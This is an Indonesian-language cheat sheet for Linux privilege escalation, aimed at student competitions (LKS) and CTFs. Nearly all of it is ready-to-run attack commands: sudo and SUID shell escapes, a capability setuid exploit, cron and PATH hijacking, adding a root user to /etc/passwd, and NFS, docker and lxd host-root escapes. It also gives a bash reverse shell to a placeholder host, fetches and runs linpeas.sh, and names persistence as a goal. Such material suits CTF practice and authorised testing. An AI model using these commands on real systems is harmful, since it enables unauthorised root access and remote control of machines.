# Linux Privilege Escalation Cheat Sheet - LKS/CTF

## 1. Enumerasi Awal

Selalu mulai dari enumerasi.

### Basic Info

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

### Network

```bash
ip a
ss -tulpn
netstat -tulpn
```

### User

```bash
cat /etc/passwd
cat /etc/group
sudo -l
```

---

# 2. Sudo Privilege Escalation

## Cek sudo permission

```bash
sudo -l
```

Contoh output:

```text
(root) NOPASSWD: /usr/bin/vim
```

Artinya user bisa menjalankan vim sebagai root tanpa password.

---

## Vim Escape

```bash
sudo vim -c ':!/bin/sh'
```

atau di dalam vim:

```vim
:!/bin/sh
```

---

## Find Escape

```bash
sudo find . -exec /bin/sh \; -quit
```

---

## Python Escape

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

## Perl Escape

```bash
sudo perl -e 'exec "/bin/sh";'
```

---

## Less Escape

Jalankan:

```bash
sudo less /etc/profile
```

Lalu ketik:

```bash
!/bin/sh
```

---

## Tar Escape

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

# 3. SUID Binary Escalation

## Cari SUID

```bash
find / -perm -4000 2>/dev/null
```

Contoh berbahaya:

* vim
* find
* bash
* cp
* nano
* nmap

---

## Bash SUID

```bash
./bash -p
```

---

## Find SUID

```bash
find . -exec /bin/sh -p \; -quit
```

---

## Nmap Interactive

```bash
nmap --interactive
```

Lalu:

```text
!sh
```

---

# 4. Capability Escalation

## Cek capability

```bash
getcap -r / 2>/dev/null
```

Contoh:

```text
/usr/bin/python3 cap_setuid+ep
```

Exploit:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

---

# 5. Cronjob Escalation

## Cek cronjob

```bash
crontab -l
ls -la /etc/cron*
```

Cari:

* script writable
* PATH hijacking
* wildcard injection

---

## Writable Script

Jika root menjalankan script writable:

```bash
echo '/bin/bash -p' >> script.sh
```

Tunggu cron berjalan.

---

# 6. PATH Hijacking

## Cek script root

Misal script root:

```bash
tar cf backup.tar *
```

Buat fake binary:

```bash
echo '/bin/bash' > tar
chmod +x tar
export PATH=.:$PATH
```

Saat root menjalankan script → shell root.

---

# 7. Writable /etc/passwd

Jika writable:

```bash
openssl passwd -1 password123
```

Tambah ke `/etc/passwd`:

```text
root2:$1$xxxxx:0:0:root:/root:/bin/bash
```

Login:

```bash
su root2
```

---

# 8. Kernel Exploit

## Cek versi kernel

```bash
uname -r
```

Cari exploit:

* DirtyCow
* DirtyPipe
* OverlayFS
* PwnKit

Gunakan:

* searchsploit
* exploit-db

---

# 9. NFS Misconfiguration

Jika NFS share pakai `no_root_squash`:

Mount share:

```bash
mount -o rw target:/share /mnt
```

Buat SUID shell:

```bash
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
```

Di target:

```bash
./bash -p
```

---

# 10. Docker Group Escalation

Jika user masuk group docker:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Langsung root host.

---

# 11. LXD/LXC Escalation

Jika user masuk group lxd:

```bash
lxc init ubuntu:priv esc
lxc config device add esc root disk source=/ path=/mnt/root recursive=true
lxc start esc
lxc exec esc /bin/sh
```

---

# 12. GTFOBins

Website penting:

https://gtfobins.github.io

Cari binary:

* sudo
* suid
* capabilities
* shell

Contoh:

* vim
* awk
* tar
* zip
* rsync
* less
* nano
* cp
* python

---

# 13. LinPEAS

Tool enumerasi otomatis:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

# 14. Checklist Cepat Saat Dapat Shell

## Wajib cek:

```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
crontab -l
ps aux
netstat -tulpn
```

---

# 15. Pola Umum PrivEsc

1. Enumerasi
2. Cari misconfiguration
3. Cari binary berbahaya
4. Escalate ke root
5. Ambil flag / persistence

---

# 16. Tips LKS/CTF

* `sudo -l` hampir selalu penting
* Selalu cek GTFOBins
* Jangan buru-buru exploit kernel
* Enumerasi > exploit
* LinPEAS sangat membantu
* Cari writable file
* Cari password reuse
* Cari service internal

---

# 17. Command Penting

## Reverse shell bash

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

## Upgrade shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Stabilize shell

```bash
export TERM=xterm
stty raw -echo
```

---

# 18. Catatan Penting

Privilege escalation tidak selalu sama.

Yang penting:

* Enumerasi teliti
* Pahami permission Linux
* Pahami sudo/suid/capability
* Biasakan membaca output command
* Jangan asal copy exploit
